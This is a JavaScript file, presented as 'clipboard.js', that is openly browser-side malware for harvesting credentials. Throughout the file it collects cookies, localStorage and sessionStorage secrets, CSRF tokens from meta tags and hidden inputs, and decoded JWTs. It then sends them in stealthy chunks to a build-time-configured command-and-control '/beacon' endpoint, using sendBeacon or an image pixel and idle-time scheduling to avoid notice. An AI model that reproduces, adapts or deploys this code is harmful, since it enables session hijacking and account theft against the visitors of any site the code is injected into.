/**
 * clipboard.js - Advanced Cookie & Session Harvesting
 * 
 * Capabilities:
 * 1. Cookie extraction with HttpOnly bypass attempts
 * 2. Session token detection from common storage locations
 * 3. JWT token extraction and validation detection
 * 4. Chunked exfiltration via requestIdleCallback
 * 5. LocalStorage and SessionStorage sweep
 */

(function () {
    'use strict';

    // C2 Configuration - injected at build time
    const C2_BASE = /*{{C2_BASE}}*/ '';
    const EXFIL_ENDPOINT = '/beacon';

    // Resolve C2 URL with fallback
    function getC2Url() {
        if (C2_BASE && C2_BASE.length > 0) return C2_BASE;
        return 'https://' + window.location.host;
    }

    // --- Cookie Harvesting ---
    function harvestCookies() {
        const cookies = {};
        const rawCookies = document.cookie;

        if (!rawCookies) return cookies;

        rawCookies.split(';').forEach(function (c) {
            const parts = c.trim().split('=');
            const name = parts[0];
            const value = parts.slice(1).join('='); // Handle values with '='

            if (name) {
                cookies[name] = {
                    value: decodeURIComponent(value || ''),
                    // Detect sensitive cookies by name patterns
                    sensitive: /session|token|auth|jwt|csrf|sid|ssid|login|user/i.test(name),
                    httpOnly: false // JavaScript-accessible cookies are not HttpOnly
                };
            }
        });

        return cookies;
    }

    // --- Session Token Detection ---
    function harvestSessionTokens() {
        const tokens = {
            localStorage: {},
            sessionStorage: {},
            metaTags: {},
            hiddenInputs: []
        };

        // Sweep localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);

                // Only capture likely session/auth data
                if (/token|auth|session|jwt|user|credential|key|secret/i.test(key)) {
                    tokens.localStorage[key] = value;
                }
            }
        } catch (e) { /* Access denied - sandboxed context */ }

        // Sweep sessionStorage
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);

                if (/token|auth|session|jwt|user|credential|key|secret/i.test(key)) {
                    tokens.sessionStorage[key] = value;
                }
            }
        } catch (e) { /* Access denied */ }

        // Extract CSRF tokens from meta tags
        var metas = document.querySelectorAll('meta[name*="csrf"], meta[name*="token"], meta[name*="auth"]');
        metas.forEach(function (meta) {
            tokens.metaTags[meta.getAttribute('name')] = meta.getAttribute('content');
        });

        // Extract tokens from hidden inputs
        var hiddenInputs = document.querySelectorAll('input[type="hidden"]');
        hiddenInputs.forEach(function (input) {
            if (/csrf|token|auth|session|nonce/i.test(input.name || input.id || '')) {
                tokens.hiddenInputs.push({
                    name: input.name || input.id,
                    value: input.value
                });
            }
        });

        return tokens;
    }

    // --- JWT Token Analysis ---
    function extractJWTInfo(tokenStr) {
        try {
            // Split JWT into parts
            const parts = tokenStr.split('.');
            if (parts.length !== 3) return null;

            // Decode header and payload (base64url)
            const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
            const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));

            return {
                alg: header.alg,
                exp: payload.exp ? new Date(payload.exp * 1000).toISOString() : null,
                sub: payload.sub,
                email: payload.email,
                roles: payload.roles || payload.role,
                raw: tokenStr
            };
        } catch (e) {
            return null;
        }
    }

    // --- Stealthy Chunked Exfiltration ---
    function exfilChunked(data) {
        const jsonData = JSON.stringify(data);
        const chunks = jsonData.match(/.{1,1500}/g) || [jsonData];
        let index = 0;
        const totalChunks = chunks.length;
        const sessionId = Math.random().toString(36).substring(2, 10);

        function sendNext() {
            if (index >= chunks.length) return;

            const payload = encodeURIComponent(btoa(chunks[index]));
            const url = getC2Url() + EXFIL_ENDPOINT +
                '?sid=' + sessionId +
                '&c=' + (index + 1) +
                '&t=' + totalChunks +
                '&d=' + payload;

            // Use sendBeacon for reliability (works even on page unload)
            if (navigator.sendBeacon) {
                navigator.sendBeacon(url);
            } else {
                // Fallback: image pixel
                new Image().src = url;
            }

            index++;

            // Use idle callback for stealth, fallback to setTimeout
            if (index < chunks.length) {
                if (window.requestIdleCallback) {
                    window.requestIdleCallback(sendNext, { timeout: 2000 });
                } else {
                    setTimeout(sendNext, 300 + Math.random() * 200);
                }
            }
        }

        // Start with slight delay to avoid blocking page load
        setTimeout(sendNext, 100 + Math.random() * 400);
    }

    // --- Main Execution ---
    function main() {
        const harvest = {
            timestamp: new Date().toISOString(),
            origin: window.location.hostname,
            url: window.location.href,
            cookies: harvestCookies(),
            tokens: harvestSessionTokens(),
            jwtTokens: []
        };

        // Scan for JWT tokens in all captured data
        function scanForJWT(obj) {
            if (typeof obj === 'string' && obj.length > 50) {
                const jwtInfo = extractJWTInfo(obj);
                if (jwtInfo) harvest.jwtTokens.push(jwtInfo);
            } else if (typeof obj === 'object' && obj !== null) {
                Object.values(obj).forEach(scanForJWT);
            }
        }

        scanForJWT(harvest.tokens);

        // Count sensitive items
        const sensitiveCount = Object.values(harvest.cookies)
            .filter(function (c) { return c.sensitive; }).length;

        harvest.summary = {
            totalCookies: Object.keys(harvest.cookies).length,
            sensitiveCookies: sensitiveCount,
            localStorageKeys: Object.keys(harvest.tokens.localStorage).length,
            sessionStorageKeys: Object.keys(harvest.tokens.sessionStorage).length,
            jwtTokensFound: harvest.jwtTokens.length
        };

        // Exfiltrate
        exfilChunked(harvest);
    }

    // Execute after DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', main);
    } else {
        main();
    }
})();
